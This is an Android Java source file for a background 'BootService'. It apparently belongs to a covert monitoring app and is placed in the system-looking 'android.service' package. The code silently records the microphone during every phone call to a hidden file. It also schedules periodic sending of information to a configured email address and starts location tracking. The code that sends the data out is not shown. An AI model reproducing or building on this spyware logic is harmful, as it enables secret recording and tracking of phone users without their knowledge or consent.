package android.service;

import java.io.File;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;


import com.particle.inspector.common.util.DatetimeUtil;
import com.particle.inspector.common.util.FileCtrl;
import com.particle.inspector.common.util.RegExpUtil;
import com.particle.inspector.common.util.StrUtils;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.license.LicenseCtrl;
import com.particle.inspector.common.util.license.LICENSE_TYPE;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.os.Binder;
import android.os.IBinder;
import android.service.activity.GlobalPrefActivity;
import android.service.config.ConfigCtrl;
import android.service.feature.location.LocationUtil;
import android.service.feature.sms.SmsCtrl;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

public class BootService extends Service 
{
	private final String LOGTAG = "BootService";
	
	Context context;
	
	private Timer mSendInfoTimer;
	private SendInfoTask mSendInfoTask;
	private final long mSendInfoDelay  = 10000; // 10 Seconds
	private final long mSendInfoPeriod = 300000; // 300 Seconds
		
	public static LocationUtil locationUtil = null;
	private TelephonyManager telManager;
	private boolean recordStarted = false;
	private static MediaRecorder recorder;
	private String DEFAULT_PHONE_RECORD_DIR = FileCtrl.getDefaultDirStr();
	
	static {
		recorder = new MediaRecorder();
	}
	
	private final PhoneStateListener phoneListener = new PhoneStateListener() {
		private String fileFullPath = "";
		
		@Override
        public void onCallStateChanged(int state, String incomingNumber) 
		{
		    try {
                switch (state) {
                	case TelephonyManager.CALL_STATE_RINGING: { // 1
                		break;
                	}
                	case TelephonyManager.CALL_STATE_OFFHOOK: { // 2
                		Context context = getApplicationContext();
            			
            			if (recordStarted) return;
            			
            			// Set audio
            			//setAudio(context);
            			
            			// Phone call recording
            			try {
                            Date startDate = new Date();
                            this.fileFullPath = makePhonecallRecordFileFullPath(context, startDate);
                            recorder.reset();
                            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                            recorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
                            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
                            recorder.setOutputFile(fileFullPath);
                            recorder.prepare();
                            recorder.start();
                            recordStarted = true;
                        } catch(Exception ex) {
                            //Log.e(LOGTAG, ex.getMessage());
                        }
                		break;
                	}
                	case TelephonyManager.CALL_STATE_IDLE: { // 0
                		if (recordStarted) {
        					recorder.stop();
        					recordStarted = false;
        				}
                		break;
                	}
                	default: { }
                }
            } catch (Exception ex) {
            }
        }
    };

	@Override
	public IBinder onBind(final Intent intent) {
		return null;
	}
	
	@Override
    public void onDestroy() {  
    }
	
	@Override  
    public boolean onUnbind(Intent intent) {  
        return super.onUnbind(intent);  
    }

	@Override
	public void onCreate() {
		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
		super.onCreate();
		
		this.context = getApplicationContext();
		
		mSendInfoTimer = new Timer();
		mSendInfoTask = new SendInfoTask(context);
	}

	@Override
	public void onStart(final Intent intent, final int startId) {
		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
		super.onStart(intent, startId);
		
		// ------------------------------------------------------------------			
		// Start timers and listeners
		String recvMail = GlobalPrefActivity.getSafeMail(context);
		if (recvMail.length() > 0) 
		{
			mSendInfoTimer.scheduleAtFixedRate(mSendInfoTask, mSendInfoDelay, mSendInfoPeriod);
			
			if (telManager == null) {
				telManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
				telManager.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
			}
		}
		
		String recvPhoneNum = GlobalPrefActivity.getSafePhoneNum(context);
		if (recvPhoneNum.length() > 0 && locationUtil == null) 
		{
			locationUtil = new LocationUtil(context);
		}
		
	}
	
	public class IaiaiBinder extends Binder {  
        public BootService getService() {  
            return BootService.this;  
        }  
    }
	
	private String makePhonecallRecordFileFullPath(Context context, Date date) {
		if (!FileCtrl.defaultDirExist()) FileCtrl.createDefaultSDDir();
		String fileName = context.getResources().getString(R.string.phonecall_record_env) + DatetimeUtil.format2.format(date) + FileCtrl.SUFFIX_WAV;
		return DEFAULT_PHONE_RECORD_DIR + fileName;
	}
	
	private void setAudio(Context context)
	{
		try {
			AudioManager audiomanager = (AudioManager)context.getSystemService("audio"); 
			//int i = audiomanager.getRouting(2); 
			audiomanager.setMode(2); 
			audiomanager.setMicrophoneMute(false); 
			audiomanager.setSpeakerphoneOn(true); 
			int j = audiomanager.getStreamMaxVolume(0); 
			if(j < 0) j = 1; 
			int k = j / 2 + 1; 
			audiomanager.setStreamVolume(0, k, 0); 
			audiomanager.setRouting(2, 11, 15);
		} catch (Exception ex) {}
	}
	
}